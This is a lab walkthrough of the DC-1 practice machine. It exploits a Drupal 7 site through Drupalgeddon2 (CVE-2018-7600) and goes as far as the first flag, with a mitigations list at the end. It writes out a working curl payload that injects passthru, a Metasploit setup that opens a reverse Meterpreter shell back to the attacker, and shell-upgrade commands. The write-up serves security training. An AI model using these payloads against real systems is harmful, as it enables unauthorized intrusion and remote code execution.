# DC-1 — Walkthrough

| Field | Detail |
|---|---|
| Machine | DC-1 |
| Series | DC |
| Author | DCAU |
| Release Date | 28 Feb 2019 |
| OS | Linux |

## 🔍 Overview

DC-1 is a Linux machine running a vulnerable Drupal 7 installation, exploited via **Drupalgeddon2 (CVE-2018-7600)** to achieve remote code execution. This write-up covers reconnaissance, a manual exploitation attempt, successful exploitation via Metasploit (including diagnosing a firewall-blocked reverse shell), and initial post-exploitation up through the first flag.

---

## Phase 1 – Reconnaissance

### Step 1 – Host Discovery

```bash
sudo arp-scan --localnet
```

**Result:** Target identified at `192.168.1.12`.

### Step 2 – Full Port Scan

```bash
nmap -sC -sV -p- 192.168.1.12
```

**Open Ports:**

| Port | Service |
|---|---|
| 22 | SSH — OpenSSH |
| 80 | HTTP — Apache |

Only web and SSH were exposed, making web enumeration the logical next step.

---

## Phase 2 – Web Enumeration

### Step 3 – Visit the Website

The homepage's layout strongly resembled a Drupal CMS installation.

### Step 4 – Confirm CMS Version

```bash
curl -s http://192.168.1.12/ | head -50
```

**Found:** A `Generator` meta tag confirming **Drupal 7** — a version with several known vulnerabilities, including **Drupalgeddon2 (CVE-2018-7600)**, which allows remote code execution.

---

## Phase 3 – Manual Exploitation Attempt

### Step 5 – Understand the Vulnerability

Drupalgeddon2 abuses Drupal's Form API **Render Array** functionality. An attacker can inject a malicious `#post_render` callback (e.g., `passthru()`) along with a system command via the `#markup` parameter, achieving remote code execution if the target is vulnerable.

### Step 6 – Execute a Manual Payload

```bash
curl -g -s -X POST \
"http://192.168.1.12/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=id" \
-d "form_id=user_pass&_triggering_element_name=name&_triggering_element_value=&name=admin"
```

**Observation:** The server returned the normal Drupal user account page instead of command output — the manual payload did not trigger execution.

### Step 7 – Resolve a Curl Error

An initial `curl: (3) bad range specification` error occurred because curl interpreted the square brackets in the payload as range/glob syntax. Adding the `-g` (globoff) flag resolved this and allowed the payload to be sent correctly.

### Step 8 – Analyze the Failure

Despite the request reaching the server correctly, no command output was returned — likely due to payload/encoding mismatches or a different patch level than the manual payload targeted. Rather than continuing to debug manually, the decision was made to switch to Metasploit's tested Drupalgeddon2 module.

---

## Phase 4 – Exploitation via Metasploit

### Step 9 – Launch Metasploit

```bash
msfconsole -q
```

### Step 10 – Locate the Drupalgeddon2 Module

```bash
search drupalgeddon2
```

**Found:** `exploit/unix/webapp/drupal_drupalgeddon2`

### Step 11 – Configure the Exploit

```bash
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 192.168.1.12
set RPORT 80
set TARGETURI /
set LHOST 192.168.1.10
set LPORT 4444
show options
```

### Step 12 – First Exploitation Attempt

```bash
run
```

**Result:** `Exploit completed, but no session was created.` — no reverse connection was received.

### Step 13 – Enable Verbose Output for Debugging

```bash
set VERBOSE true
run
```

**Observation:** Verbose output confirmed the exploit successfully invoked the vulnerable `passthru()` callback on the server, but no Meterpreter session was returned — suggesting the exploit worked, but the reverse connection couldn't reach the attacker.

### Step 14 – Investigate the Firewall

```bash
sudo ufw status
```

**Found:** Only ports `22/tcp` and `3000/tcp` were allowed — port `4444` (the configured `LPORT`) was blocked, explaining the failed callback.

### Step 15 – Allow the Listener Port

```bash
sudo ufw allow 4444/tcp
```

### Step 16 – Re-run the Exploit

```bash
run
```

**Result:**

```
Sending stage (42137 bytes) to 192.168.1.12
Meterpreter session 1 opened
```

✅ Remote code execution achieved, Meterpreter session established.

---

## Phase 5 – Post-Exploitation

### Step 17 – Verify Current User

```bash
getuid
```

**Result:** Running as `www-data` (the Apache web server user).

### Step 18 – Spawn a System Shell

```bash
shell
```

### Step 19 – Upgrade to an Interactive Shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

**Result:** Interactive Bash shell as `www-data`.

### Step 20 – Locate the First Flag

```bash
find / -name flag1.txt 2>/dev/null
cat /var/www/flag1.txt
```

**Result:** The flag hinted that Drupal's configuration file (`sites/default/settings.php`) — which typically stores database credentials — was the next area to investigate for further privilege escalation.

---

## 🛡️ Key Vulnerabilities Identified

1. Outdated Drupal 7 installation vulnerable to Drupalgeddon2 (CVE-2018-7600), enabling unauthenticated remote code execution
2. Drupal's Form API render array mechanism allowed arbitrary PHP function invocation via crafted request parameters
3. Sensitive configuration files (`settings.php`) likely containing database credentials, as hinted by the first flag

## 🩹 Mitigations

1. Patch Drupal installations promptly against known CVEs, especially critical unauthenticated RCE vulnerabilities like Drupalgeddon2
2. Restrict or monitor unusual POST requests to sensitive Drupal endpoints (e.g., `user/password`)
3. Protect configuration files like `settings.php` from being readable outside the web application context
4. Ensure firewall rules on the attacker/defender side are properly scoped during authorized testing to avoid false negatives in exploit attempts
5. Apply the principle of least privilege for the web server process

---

## 🧰 Tools Used

`arp-scan` · `nmap` · `curl` · `Metasploit Framework` · `ufw` · `python (pty)`

## 🧠 Techniques Covered

Host & port discovery · CMS fingerprinting · Manual exploitation of a Drupal Form API vulnerability · Metasploit-based exploitation · Reverse shell debugging & firewall troubleshooting · Post-exploitation enumeration

---

## Summary

| Step | Description | Status |
|---|---|---|
| 1 | Host Discovery | ✅ |
| 2 | Full Port Scan | ✅ |
| 3 | Visit the Website | ✅ |
| 4 | Confirm CMS Version | ✅ |
| 5 | Understand the Vulnerability | ✅ |
| 6 | Manual Exploit Attempt | ❌ (unsuccessful) |
| 7 | Resolve Curl Error | ✅ |
| 8 | Analyze the Failure | ✅ |
| 9 | Launch Metasploit | ✅ |
| 10 | Locate Drupalgeddon2 Module | ✅ |
| 11 | Configure the Exploit | ✅ |
| 12 | First Exploitation Attempt | ❌ (no session) |
| 13 | Enable Verbose Debugging | ✅ |
| 14 | Investigate the Firewall | ✅ |
| 15 | Allow Listener Port | ✅ |
| 16 | Re-run the Exploit | ✅ |
| 17 | Verify Current User | ✅ |
| 18 | Spawn System Shell | ✅ |
| 19 | Upgrade to Interactive Shell | ✅ |
| 20 | Locate First Flag | ✅ |

**Note:** This write-up covers initial foothold and Flag 1. Full privilege escalation to root (via database credentials in `settings.php` and beyond) follows in later stages of this machine.

*Writeup for educational purposes. Machine solved as part of the "DC" series.*
